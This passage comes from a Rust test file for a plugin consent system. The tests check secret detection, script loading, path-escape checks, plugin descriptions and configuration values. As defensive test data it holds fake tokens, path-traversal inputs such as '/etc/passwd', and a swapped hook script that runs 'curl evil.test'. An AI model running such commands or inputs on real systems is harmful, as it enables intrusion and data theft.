        command: "/usr/local/bin/desk-notify".into(),
        args: vec!["--quiet".into()],
        timeout_ms: None,
        os: Default::default(),
    });
    assert!(validate(&d).is_ok());

    // 진짜 키는 여전히 막힌다 — 토큰 시작이면 잡는다.
    for bad in [
        "sk-abcdef123456789",
        "https://api.test/v1?key=sk-abcdef123456",
    ] {
        let d = def(Action::Post {
            url: bad.into(),
            headers: Default::default(),
            body_env: Default::default(),
            timeout_ms: None,
        });
        assert!(validate(&d).is_err(), "진짜 키를 놓쳤다: {bad}");
    }
}

/// 자동 허용 켜기·끄기가 **돌고 있는 것**을 흔들지 않는다([[BUG-288]]).
///
/// 끄는 순간 돌던 것이 멈추면 "끄기" 가 "전체 해제" 를 겸한다. 모드는 앞으로 올 것에
/// 대한 것이다 — 끈 뒤에 **바뀐** 것만 다시 묻는다.
#[test]
fn turning_auto_allow_off_keeps_what_runs_and_asks_about_changes() {
    let _guard = env_lock();
    let home = fresh_tmp("untrust-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("untrust");
    write_plugin(&g, "ai-notify", ai_notify(&["cli"]));

    consent::enable_auto_allow(&g).unwrap();
    assert_eq!(load_for(&g, Scope::Cli).active.len(), 1);

    consent::disable_auto_allow(&g).unwrap();
    assert_eq!(load_for(&g, Scope::Cli).active.len(), 1, "끄자마자 돌던 것이 멈췄다");

    // 끈 뒤에 정의가 바뀌면 다시 묻는다.
    write_plugin(
        &g,
        "ai-notify",
        json!({
            "name": "ai-notify",
            "on": ["quest.created"],
            "scope": ["cli"],
            "action": { "post": { "url": "https://example.test/other" } }
        }),
    );
    let after = load_for(&g, Scope::Cli);
    assert!(after.active.is_empty(), "자동 허용을 껐는데 바뀐 것이 그대로 돈다");

    // 다시 켜면 바뀐 것도 돈다.
    consent::enable_auto_allow(&g).unwrap();
    assert_eq!(load_for(&g, Scope::Cli).active.len(), 1);

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// **자동 허용 중에도 개별 철회가 먹는다**([[BUG-288]]). 예전엔 신뢰 플래그가 판정 맨
/// 앞에서 단락돼, 철회해도 계속 돌았다(화면은 버튼을 막는 것으로 얼버무렸다).
#[test]
fn revoke_wins_over_auto_allow_and_allow_undoes_it() {
    let _guard = env_lock();
    let home = fresh_tmp("deny-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("deny");
    write_plugin(&g, "ai-notify", ai_notify(&["cli"]));
    write_plugin(&g, "other", json!({
        "name": "other",
        "on": ["quest.created"],
        "scope": ["cli"],
        "action": { "post": { "url": "https://example.test/other" } }
    }));
    consent::enable_auto_allow(&g).unwrap();
    assert_eq!(load_for(&g, Scope::Cli).active.len(), 2);

    consent::revoke(&g, "ai-notify").unwrap();
    let l = load_for(&g, Scope::Cli);
    let names = |v: &[Plugin]| v.iter().map(|p| p.def.name.clone()).collect::<Vec<_>>();
    assert_eq!(names(&l.active), vec!["other"], "자동 허용이 철회를 덮었다");
    assert_eq!(names(&l.needs_consent), vec!["ai-notify"]);

    // 끄고 켜도 철회는 남는다.
    consent::disable_auto_allow(&g).unwrap();
    consent::enable_auto_allow(&g).unwrap();
    assert_eq!(names(&load_for(&g, Scope::Cli).active), vec!["other"]);

    consent::grant(&g, &load_for(&g, Scope::Cli).needs_consent[0]).unwrap();
    assert_eq!(load_for(&g, Scope::Cli).active.len(), 2, "다시 허용했는데 안 돈다");

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// 전체 허용·전체 해제는 **모드가 아니다** — 지금 있는 것들의 개별 상태를 한 번에
/// 바꿀 뿐이라, 그 뒤 개별 조작이 그대로 먹고 새로 온 것은 묻는다([[BUG-288]]).
#[test]
fn allow_all_and_revoke_all_are_bulk_edits_not_modes() {
    let _guard = env_lock();
    let home = fresh_tmp("bulk-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("bulk");
    write_plugin(&g, "ai-notify", ai_notify(&["cli"]));
    write_plugin(&g, "other", json!({
        "name": "other",
        "on": ["quest.created"],
        "scope": ["cli"],
        "action": { "post": { "url": "https://example.test/other" } }
    }));

    let l = load_for(&g, Scope::Cli);
    consent::grant_all(&g, &l.needs_consent.iter().collect::<Vec<_>>()).unwrap();
    assert_eq!(load_for(&g, Scope::Cli).active.len(), 2);

    consent::revoke(&g, "other").unwrap();
    assert_eq!(load_for(&g, Scope::Cli).active.len(), 1, "전체 허용 뒤 개별 철회가 안 먹는다");

    write_plugin(&g, "newcomer", json!({
        "name": "newcomer",
        "on": ["quest.created"],
        "scope": ["cli"],
        "action": { "post": { "url": "https://example.test/new" } }
    }));
    let l = load_for(&g, Scope::Cli);
    assert!(l.needs_consent.iter().any(|p| p.def.name == "newcomer"), "전체 허용이 앞으로 올 것까지 허용했다");

    consent::revoke_all(&g, &["ai-notify", "other", "newcomer"]).unwrap();
    assert!(load_for(&g, Scope::Cli).active.is_empty());
    let l = load_for(&g, Scope::Cli);
    consent::grant(&g, l.needs_consent.iter().find(|p| p.def.name == "other").unwrap()).unwrap();
    assert_eq!(load_for(&g, Scope::Cli).active.len(), 1, "전체 해제 뒤 개별 허용이 안 먹는다");

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// **짧은 비밀번호도 비밀이다.** 예전엔 길이 검사가 `any` 안에 있어서, 나머지가
/// 8자 이하면 `any` 가 통째로 false 가 되고 리터럴이 "환경변수 참조" 로 통과했다.
#[test]
fn a_short_literal_in_a_secret_field_is_still_rejected() {
    for bad in ["Pa55word", "s3cr3t", "abc123", "hunter2"] {
        let e = validate(&post_with_header("Authorization", bad));
        assert!(e.is_err(), "짧다고 통과했다: {bad}");
    }
    // 참조는 그대로 통과한다.
    assert!(validate(&post_with_header("Authorization", "Bearer ${TOK}")).is_ok());
    assert!(validate(&post_with_header("X-Api-Key", "${K}")).is_ok());
    // 구두점뿐인 값은 비밀이 아니다.
    assert!(validate(&post_with_header("Authorization", "  ")).is_ok());
}

/// **스크립트도 git 으로 간다.** 정의 파일의 리터럴은 막으면서 `.rhai`
/// 안의 리터럴을 통과시키면 앞뒤가 안 맞는다 — 게다가 본문은 환경변수 확장을
/// 안 거치므로 스크립트에 박는 것이 토큰을 싣는 유일한 길이었다.
#[test]
fn a_secret_in_the_script_blocks_the_plugin() {
    let _guard = env_lock();
    let home = fresh_tmp("scriptsecret-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("scriptsecret");
    write_plugin(&g, "ai-notify", with_script(&["cli"], "t.rhai"));
    write_script(
        &g,
        "ai-notify",
        "t.rhai",
        r#"fn payload(e) { #{ token: "xoxb-1234567890abcdef" } }"#,
    );
    consent::enable_auto_allow(&g).unwrap();

    let l = load_for(&g, Scope::Cli);
    assert!(l.active.is_empty(), "스크립트 안의 토큰이 통과했다");
    assert_eq!(l.errors.len(), 1);
    assert!(l.errors[0].1.contains("비밀값"), "{:?}", l.errors);

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// **`run` 이 부르는 옆 파일도 동의 대상이다.** 폴더가 작업 디렉터리이므로
/// `hook.py` 는 git 으로 따라오는 실행되는 코드다 — 갈아끼우면 다시 물어야 한다.
#[test]
fn swapping_a_sibling_program_revokes_consent() {
    let _guard = env_lock();
    let home = fresh_tmp("sibling-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("sibling");
    write_plugin(
        &g,
        "notify",
        json!({
            "name": "notify",
            "on": ["quest.created"],
            "scope": ["cli"],
            "action": { "run": { "command": "python3", "args": ["hook.py"] } }
        }),
    );
    let hook = plugins_dir(&g).join("notify/hook.py");
    std::fs::write(&hook, "print('hello')\n").unwrap();

    let l = load_for(&g, Scope::Cli);
    consent::grant(&g, &l.needs_consent[0]).unwrap();
    assert_eq!(load_for(&g, Scope::Cli).active.len(), 1);

    // 정의는 그대로. 실행되는 코드만 바뀐다.
    std::fs::write(&hook, "import os; os.system('curl evil.test')\n").unwrap();
    let after = load_for(&g, Scope::Cli);
    assert!(
        after.active.is_empty(),
        "옆 프로그램이 바뀌었는데 그대로 돌았다"
    );
    assert_eq!(after.needs_consent.len(), 1);

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

// ── 스크립트 적재 ([[DEV-376]]) ─────────────────────────

fn with_script(scope: &[&str], rel: &str) -> serde_json::Value {
    json!({
        "name": "ai-notify",
        "on": ["quest.created"],
        "scope": scope,
        "action": { "post": { "url": "https://example.test/hook" } },
        "script": rel
    })
}

fn write_script(guild: &Path, plugin: &str, rel: &str, src: &str) {
    let p = plugins_dir(guild).join(plugin).join(rel);
    std::fs::create_dir_all(p.parent().unwrap()).unwrap();
    std::fs::write(p, src).unwrap();
}

/// 문법 오류는 **적재 때** 걸린다 — 첫 이벤트 때 걸리면 이미 늦다.
#[test]
fn a_broken_script_stops_that_plugin_at_load() {
    let _guard = env_lock();
    let home = fresh_tmp("script-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("script");
    write_plugin(&g, "ai-notify", with_script(&["cli"], "t.rhai"));
    write_script(&g, "ai-notify", "t.rhai", "fn should_send(e) { ");
    write_plugin(&g, "plain", {
        let mut v = ai_notify(&["cli"]);
        v["name"] = json!("plain");
        v
    });
    consent::enable_auto_allow(&g).unwrap();

    let l = load_for(&g, Scope::Cli);
    assert_eq!(
        l.active.len(),
        1,
        "깨진 스크립트 때문에 멀쩡한 것이 안 실렸다"
    );
    assert_eq!(l.active[0].def.name, "plain");
    assert_eq!(l.errors.len(), 1);
    assert!(l.errors[0].1.contains("컴파일"), "{:?}", l.errors);

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// 스크립트 파일이 아예 없으면 그 플러그인은 안 돈다 — 판단 계층이 빠진 채로
/// 돌면 안 보낼 것을 보내게 된다.
#[test]
fn a_missing_script_stops_that_plugin() {
    let _guard = env_lock();
    let home = fresh_tmp("noscript-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("noscript");
    write_plugin(&g, "ai-notify", with_script(&["cli"], "gone.rhai"));
    consent::enable_auto_allow(&g).unwrap();

    let l = load_for(&g, Scope::Cli);
    assert!(l.active.is_empty());
    assert_eq!(l.errors.len(), 1);

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// `script` 는 플러그인 폴더를 벗어날 수 없다 — 정의만으로 임의 파일을
/// 컴파일 대상으로 지정할 수 있으면 안 된다.
#[test]
fn script_path_cannot_escape_the_plugin_dir() {
    for bad in ["../../secret.rhai", "/etc/passwd"] {
        let mut d = def(Action::Post {
            url: "https://x.test".into(),
            headers: Default::default(),
            body_env: Default::default(),
            timeout_ms: None,
        });
        d.scripts = vec![bad.into()];
        let e = validate(&d).unwrap_err().to_string();
        assert!(e.contains("상대 경로"), "{bad}: {e}");
    }
    let mut ok = def(Action::Post {
        url: "https://x.test".into(),
        headers: Default::default(),
        body_env: Default::default(),
        timeout_ms: None,
    });
    ok.scripts = vec!["sub/transform.rhai".into()];
    assert!(validate(&ok).is_ok());
}

/// **스크립트를 갈아끼우면 다시 묻는다.** 정의 파일은 그대로인데
/// 보내는 내용만 바뀌는 길이 있으면 동의가 헐거워진다.
#[test]
fn changing_only_the_script_revokes_consent() {
    let _guard = env_lock();
    let home = fresh_tmp("rescript-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("rescript");
    write_plugin(&g, "ai-notify", with_script(&["cli"], "t.rhai"));
    write_script(
        &g,
        "ai-notify",
        "t.rhai",
        r#"fn h(e) { send("out", #{ id: e.quest.id }) }"#,
    );

    let l = load_for(&g, Scope::Cli);
    consent::grant(&g, &l.needs_consent[0]).unwrap();
    assert_eq!(load_for(&g, Scope::Cli).active.len(), 1);

    // 정의는 그대로. 실어 보내는 내용만 통째로 바뀐다.
    write_script(&g, "ai-notify", "t.rhai", r#"fn h(e) { send("out", e) }"#);
    let after = load_for(&g, Scope::Cli);
    assert!(
        after.active.is_empty(),
        "스크립트가 바뀌었는데 그대로 돌았다"
    );
    assert_eq!(after.needs_consent.len(), 1);

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

// ── 적재 → 실행 연결 ────────────────────────────────────

#[derive(Default)]
struct Rec(std::sync::Mutex<Vec<String>>);
impl runtime::Delivery for Rec {
    fn deliver(
        &self,
        p: &Plugin,
        _a: &Action,
        e: &crate::events::Event,
        _b: &serde_json::Value,
        _v: &std::collections::BTreeMap<String, String>,
    ) -> Result<(), String> {
        self.0
            .lock()
            .unwrap()
            .push(format!("{}:{}", p.def.name, e.name));
        Ok(())
    }
}

/// 적재 결과가 **emit 의 게이트**가 된다([[DEV-374]]) — 길드를 열고
/// `install_plugins` 를 부르면 그때부터 `ops` 의 emit 이 플러그인에 닿는다.
#[tokio::test]
async fn loaded_plugin_receives_real_events() {
    let home = fresh_tmp("wire-home");
    let g = fresh_tmp("wire");
    crate::repo::seed_guild_dir(&g).unwrap();
    write_plugin(&g, "ai-notify", ai_notify(&["cli"]));

    let store = crate::Store::open(&g).await.unwrap();
    let rec = std::sync::Arc::new(Rec::default());

    // env 를 건드리는 구간만 잠근다. 동의 기록과 적재는 전부 동기라 여기서
    // 끝나고, 잠금이 아래 await 에 걸쳐 들려 있지 않는다.
    let loaded = {
        let _guard = env_lock();
        unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
        consent::enable_auto_allow(&g).unwrap();
        let loaded = store.install_plugins(Scope::Cli, rec.clone());
        unsafe { std::env::remove_var("OPENGUILD_HOME") };
        loaded
    };
    assert_eq!(loaded.active.len(), 1);

    crate::ops::quests::create_quest(
        &store,
        crate::models::CreateQuestRequest {
            quest_type_id: 1,
            title: "훅".into(),
            description: None,
            status_slug: "open".into(),
            urgency: Some(3),
            parent_quest_id: None,
        },
    )
    .await
    .unwrap();

    // 전달은 mutation 을 기다리지 않고 떠났다 — 종료 전 유예를 준다.
    assert!(store.drain_events(std::time::Duration::from_secs(5)));
    assert_eq!(
        rec.0.lock().unwrap().as_slice(),
        ["ai-notify:quest.created"]
    );

    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// **아무도 안 붙으면 sink 자체를 안 꽂는다.** 그래야 `ops` 가 페이로드를
/// 만들지도 않고, 플러그인을 안 쓰는 길드가 비용을 치르지 않는다.
#[tokio::test]
async fn no_active_plugin_means_no_sink() {
    let home = fresh_tmp("nosink-home");
    let g = fresh_tmp("nosink");
    crate::repo::seed_guild_dir(&g).unwrap();
    // 정의는 있지만 이 컴포넌트의 scope 가 아니다.
    write_plugin(&g, "ai-notify", ai_notify(&["gui"]));

    let store = crate::Store::open(&g).await.unwrap();
    let loaded = {
        let _guard = env_lock();
        unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
        consent::enable_auto_allow(&g).unwrap();
        let loaded = store.install_plugins(Scope::Cli, std::sync::Arc::new(runtime::DropDelivery));
        unsafe { std::env::remove_var("OPENGUILD_HOME") };
        loaded
    };
    assert!(loaded.active.is_empty());
    assert!(!store.events.has_sink(), "돌 게 없는데 sink 가 꽂혔다");
    assert!(
        !store.events_wanted(
            crate::events::names::QUEST_CREATED,
            crate::events::Phase::Post
        ),
        "구독자가 없는데 이벤트를 만들 참이었다"
    );

    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

// ── REQ-020: 설명 ───────────────────────────────────────

fn post_def() -> PluginDef {
    def(Action::Post {
        url: "https://x.test".into(),
        headers: Default::default(),
        body_env: Default::default(),
        timeout_ms: None,
    })
}

/// 정의부터 `PluginView` 까지 값이 실제로 간다. 중간 어느 한 곳이 빠뜨리면
/// 화면에는 아무것도 안 뜨는데 어디서 끊겼는지 알 수 없다.
#[test]
fn a_description_reaches_the_view() {
    let _guard = env_lock();
    let home = fresh_tmp("desc-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("desc");
    let mut body = ai_notify(&["cli"]);
    body["description"] = json!("퀘스트가 생기면 내 서비스로 보냅니다.");
    write_plugin(&g, "ai-notify", body);

    let loaded = load_all(&g);
    assert!(loaded.errors.is_empty(), "{:?}", loaded.errors);
    let p = loaded.needs_consent.first().expect("적재됐어야 한다");
    assert_eq!(
        p.def.description.as_deref(),
        Some("퀘스트가 생기면 내 서비스로 보냅니다.")
    );

    let v = view::view(p, false, Scope::Cli);
    assert_eq!(
        v.description.as_deref(),
        Some("퀘스트가 생기면 내 서비스로 보냅니다."),
        "정의에는 있는데 화면으로 가는 모양에서 사라졌다"
    );

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// 선택 필드다. 없는 기존 정의가 그대로 적재돼야 한다.
#[test]
fn a_definition_without_a_description_still_loads() {
    let _guard = env_lock();
    let home = fresh_tmp("nodesc-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("nodesc");
    write_plugin(&g, "ai-notify", ai_notify(&["cli"]));

    let loaded = load_all(&g);
    assert!(loaded.errors.is_empty(), "{:?}", loaded.errors);
    let p = loaded.needs_consent.first().expect("적재됐어야 한다");
    assert!(p.def.description.is_none());
    assert!(view::view(p, false, Scope::Cli).description.is_none());

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// **업그레이드로 기존 동의가 전부 날아가면 안 된다.** 지문은 정의를 통째로
/// 직렬화한 것이라([`consent::fingerprint`]), 필드가 늘면서 `"description":
/// null` 이 끼면 어제 허용한 플러그인이 오늘 전부 "동의 대기" 가 된다.
/// `skip_serializing_if` 가 그걸 막는데, 그건 빼기 쉬운 한 줄이다.
#[test]
fn an_absent_description_does_not_change_the_fingerprint() {
    let d = post_def();
    let json = serde_json::to_value(&d).unwrap();
    assert!(
        json.get("description").is_none(),
        "설명이 없는데 직렬화에 나타났다 — 기존 동의가 전부 무효가 된다: {json}"
    );
}

/// 공백뿐인 설명은 없는 것으로 읽는다. 화면에는 똑같이 아무것도 안 보이는데
/// 지문에서는 다른 값이라, 넣었다 뺐다 하는 것만으로 동의를 다시 묻는다.
#[test]
fn a_blank_description_is_read_as_absent() {
    let g = fresh_tmp("blankdesc");
    let mut body = ai_notify(&["cli"]);
    body["description"] = json!("   \n  ");
    write_plugin(&g, "ai-notify", body);

    let d = read_def(&plugins_dir(&g).join("ai-notify").join(MANIFEST)).unwrap();
    assert!(d.description.is_none(), "{:?}", d.description);
    assert!(
        serde_json::to_value(&d)
            .unwrap()
            .get("description")
            .is_none()
    );
    let _ = std::fs::remove_dir_all(&g);
}

/// 앞뒤 공백은 턴다 — 화면과 지문이 같은 문자열을 봐야 한다.
#[test]
fn a_description_is_trimmed() {
    let g = fresh_tmp("trimdesc");
    let mut body = ai_notify(&["cli"]);
    body["description"] = json!("  알림을 보냅니다.  ");
    write_plugin(&g, "ai-notify", body);

    let d = read_def(&plugins_dir(&g).join("ai-notify").join(MANIFEST)).unwrap();
    assert_eq!(d.description.as_deref(), Some("알림을 보냅니다."));
    let _ = std::fs::remove_dir_all(&g);
}

/// 상한을 넘기면 적재에서 걸린다. 화면 한 줄 자리이고 지문에도 들어간다.
#[test]
fn an_overlong_description_is_rejected() {
    let mut d = post_def();
    d.description = Some("가".repeat(MAX_DESCRIPTION_CHARS + 1));
    let e = validate(&d).unwrap_err().to_string();
    assert!(e.contains("description"), "{e}");

    // 딱 상한까지는 통과한다 — 경계에서 한 칸 어긋나면 멀쩡한 설명이 막힌다.
    d.description = Some("가".repeat(MAX_DESCRIPTION_CHARS));
    assert!(validate(&d).is_ok());
}

/// **문자 수로 센다.** 바이트로 세면 한글 설명이 영어의 3분의 1 길이에서
/// 막힌다 — 한글은 UTF-8 에서 글자당 3바이트다.
#[test]
fn the_description_limit_counts_characters_not_bytes() {
    let mut d = post_def();
    let korean = "가".repeat(MAX_DESCRIPTION_CHARS);
    assert!(korean.len() > MAX_DESCRIPTION_CHARS, "전제가 틀렸다");
    d.description = Some(korean);
    assert!(
        validate(&d).is_ok(),
        "한글 설명이 상한 안인데 바이트로 세서 막혔다"
    );
}

/// git 에 커밋되는 자유 텍스트다. 다른 필드는 막으면서 여기만 열어 두면
/// 토큰을 적을 자리를 하나 만들어 주는 셈이다.
#[test]
fn a_secret_in_the_description_is_rejected() {
    let mut d = post_def();
    d.description = Some("키는 sk-ABCDEFGHIJKLMNOPQRSTUVWXYZ0123 를 쓰세요".into());
    let e = validate(&d).unwrap_err().to_string();
    assert!(e.contains("description"), "{e}");
}

// ── BUG-279: 훅이 자기 동의를 깨지 않는다 ────────────────

fn probe_event() -> crate::events::Event {
    crate::events::Event {
        name: "quest.created",
        phase: crate::events::Phase::Post,
        ts: "2026-09-07T00:00:00+09:00".into(),
        guild: "g".into(),
        ok: Some(true),
        error: None,
        data: Default::default(),
        origin: Default::default(),
    }
}

/// **이 결함의 본체.** 폴더에 파일을 쓰는 `run` 훅을 허용하고 두 번 발화시킨다.
///
/// 예전에는 첫 번째가 `deleted.log` 를 플러그인 폴더에 만들고, 그 순간 폴더
/// 지문이 바뀌어 두 번째부터 **동의가 풀렸다.** 아무 오류도 안 나고 조용히
/// 안 돈다 — admin 이 `deleted-audit` 으로 실제로 밟았다.
///
/// 시간이나 파일 존재만 보면 안 된다. "허용된 상태가 유지되는가" 를 직접 본다.
#[test]
fn a_hook_that_writes_files_keeps_its_consent() {
    let _guard = env_lock();
    let home = fresh_tmp("selfrevoke-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("selfrevoke");
    write_plugin(
        &g,
        "audit",
        json!({
            "name": "audit",
            "on": ["quest.created"],
            "scope": ["cli"],
            "action": { "run": { "command": "sh",
                                 "args": ["-c", "cat >> out.log"],
                                 "timeout_ms": 5000 } }
        }),
    );

    let before = load_all(&g);
    let p = before.needs_consent.first().expect("적재됐어야 한다");
    consent::grant(&g, p).unwrap();
    assert_eq!(load_all(&g).active.len(), 1, "허용 직후인데 안 켜졌다");

    // 훅을 두 번 태운다.
    let out = super::delivery::Outbound::new();
    for _ in 0..2 {
        let plugin = load_all(&g)
            .active
            .into_iter()
            .next()
            .expect("동의가 풀렸다 — 훅이 만든 파일이 지문을 바꿨다(BUG-279 의 증상)");
        crate::plugins::runtime::Delivery::deliver(
            &out,
            &plugin,
            first_action(&plugin),
            &probe_event(),
            &json!({ "hello": "world" }),
            &Default::default(),
        )
        .unwrap();
    }

    // 두 번 다 돌았으니 로그에 두 줄이 쌓여 있어야 한다 — "동의는 살아 있는데
    // 실은 아무 일도 안 했다" 를 가른다.
    let data = crate::plugins::data_dir(&g, "audit").unwrap();
    let log = std::fs::read_to_string(data.join("out.log")).unwrap();
    assert_eq!(
        log.matches("hello").count(),
        2,
        "훅이 두 번 안 돌았다: {log}"
    );

    // 코드 폴더는 손대지 않았다.
    let pdir = plugins_dir(&g).join("audit");
    assert!(
        !pdir.join("out.log").exists(),
        "훅의 출력이 코드 폴더에 생겼다 — 지문이 바뀐다"
    );
    assert_eq!(
        folder_fingerprint(&pdir).len(),
        0,
        "코드 폴더에 정의 파일 말고 무언가 생겼다"
    );

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// 코드 폴더는 `OPENGUILD_PLUGIN_DIR` 로 알려준다 — 작업 디렉터리가 더는
/// 그곳이 아니므로, 이게 없으면 `desktop-notify` 처럼 옆 파일을 부르는
/// 플러그인이 통째로 못 돈다.
#[test]
fn the_hook_is_told_where_its_code_lives() {
    let _guard = env_lock();
    let home = fresh_tmp("plugindir-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("plugindir");
    write_plugin(
        &g,
        "sibling",
        json!({
            "name": "sibling",
            "on": ["quest.created"],
            "scope": ["cli"],
            "action": { "run": { "command": "sh",
                                 // 옆 파일을 코드 폴더에서 부른다.
                                 "args": ["-c", "sh \"$OPENGUILD_PLUGIN_DIR/hello.sh\" > said.txt"],
                                 "timeout_ms": 5000 } }
        }),
    );
    let pdir = plugins_dir(&g).join("sibling");
    std::fs::write(pdir.join("hello.sh"), "echo 안녕\n").unwrap();

    let p = load_all(&g).needs_consent.into_iter().next().unwrap();
    consent::grant(&g, &p).unwrap();
    let p = load_all(&g).active.into_iter().next().unwrap();
    crate::plugins::runtime::Delivery::deliver(
        &super::delivery::Outbound::new(),
        &p,
        first_action(&p),
        &probe_event(),
        &json!({}),
        &Default::default(),
    )
    .unwrap();

    let data = crate::plugins::data_dir(&g, "sibling").unwrap();
    assert_eq!(
        std::fs::read_to_string(data.join("said.txt"))
            .unwrap()
            .trim(),
        "안녕",
        "옆 파일을 못 불렀다 — OPENGUILD_PLUGIN_DIR 가 코드 폴더를 안 가리킨다"
    );

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&g);
    let _ = std::fs::remove_dir_all(&home);
}

/// `name` 은 동의 파일의 키이자 데이터 폴더 이름이 된다. 경로 조각이 될 수
/// 없는 값은 적재에서 막는다 — 정의는 git 으로 남의 기계에 간다.
#[test]
fn a_name_that_is_a_path_is_rejected() {
    for bad in ["../../etc", "a/b", "..", "."] {
        let mut d = post_def();
        d.name = bad.into();
        assert!(
            validate(&d).is_err(),
            "경로가 될 수 있는 이름이 통과했다: {bad}"
        );
    }
}

/// 이름이 같은 다른 길드의 데이터가 안 섞인다 — 폴더 이름이 경로 전체를
/// 반영해야 한다.
#[test]
fn two_guilds_with_the_same_folder_name_get_different_data_dirs() {
    let _guard = env_lock();
    let home = fresh_tmp("datakey-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let a = fresh_tmp("datakey-a").join("work");
    let b = fresh_tmp("datakey-b").join("work");
    std::fs::create_dir_all(&a).unwrap();
    std::fs::create_dir_all(&b).unwrap();
    assert_eq!(a.file_name(), b.file_name(), "전제가 틀렸다");
    assert_ne!(
        crate::plugins::data_dir(&a, "p").unwrap(),
        crate::plugins::data_dir(&b, "p").unwrap()
    );
    unsafe { std::env::remove_var("OPENGUILD_HOME") };
    let _ = std::fs::remove_dir_all(&home);
}

// ── REQ-021: 설정값 — 선언 · 저장 · 스크립트에서 사용 ──────

fn telegram_def() -> serde_json::Value {
    json!({
        "name": "tg",
        "on": ["quest.created", "quest.status_changed", "comment.added"],
        "scope": ["cli"],
        "inputs": [
            { "key": "BOT_TOKEN", "label": "봇 토큰", "secret": true },
            { "key": "ON_CREATED", "label": "퀘스트 생성 알림",
              "type": "checkbox", "default": true },
            { "key": "ON_COMMENT", "label": "댓글 알림",
              "type": "checkbox", "default": false },
            { "key": "INTERVAL", "label": "전송 주기", "type": "select",
              "default": "now",
              "options": [ { "value": "now", "label": "즉시" },
                           { "value": "5m",  "label": "5분" } ] }
        ],
        "action": { "post": { "url": "https://api.telegram.org/bot${BOT_TOKEN}/send" } }
    })
}

/// **세 조각이 실제로 이어지는가** — 정의가 선언하고, 저장한 값이,
/// 스크립트에 변수로 도착한다. 어느 한 곳만 봐도 이어진 걸 확인 못 한다.
#[test]
fn a_saved_value_reaches_the_script_as_a_variable() {
    let _guard = env_lock();
    let home = fresh_tmp("cfg-home");
    unsafe { std::env::set_var("OPENGUILD_HOME", &home) };
    let g = fresh_tmp("cfg");
    write_plugin(&g, "tg", telegram_def());
    let pdir = plugins_dir(&g).join("tg");
    std::fs::write(
        pdir.join("t.rhai"),
        r#"fn h(e) {
             if e.event == "quest.created" && config("ON_CREATED") { send("out", 1) }
             if e.event == "comment.added" && config("ON_COMMENT") { send("out", 2) }
           }"#,
    )
    .unwrap();
    let mut def = telegram_def();
    def["script"] = json!("t.rhai");
    write_plugin(&g, "tg", def);

    let p = load_all(&g).needs_consent.into_iter().next().unwrap();
    let sc = p.compiled.as_deref().expect("스크립트가 컴파일됐어야 한다");

    // 기본값 그대로 — 생성은 보내고 댓글은 안 보낸다.
    let cfg = |g: &std::path::Path, p: &Plugin| {
        crate::plugins::values::resolve(g, &p.def)
            .into_iter()
            .filter_map(|(k, r)| r.value.map(|v| (k, v)))
            .collect::<std::collections::BTreeMap<_, _>>()
    };
    let created = crate::events::Event {
        name: "quest.created",
        ..probe_event()
    };
    let commented = crate::events::Event {
        name: "comment.added",
        ..probe_event()
    };
    assert_eq!(sc.call_handler("h", &created, &cfg(&g, &p)).unwrap().len(), 1);
    assert!(sc.call_handler("h", &commented, &cfg(&g, &p)).unwrap().is_empty());

    // 사용자가 화면에서 댓글 알림을 켠다.
    crate::plugins::values::set(&g, "tg", "ON_COMMENT", Some(json!(true))).unwrap();
    assert_eq!(
        sc.call_handler("h", &commented, &cfg(&g, &p)).unwrap().len(),
        1,
        "체크박스를 켰는데 스크립트가 못 봤다 — 세 조각 중 하나가 끊겼다"
    );

    unsafe { std::env::remove_var("OPENGUILD_HOME") };
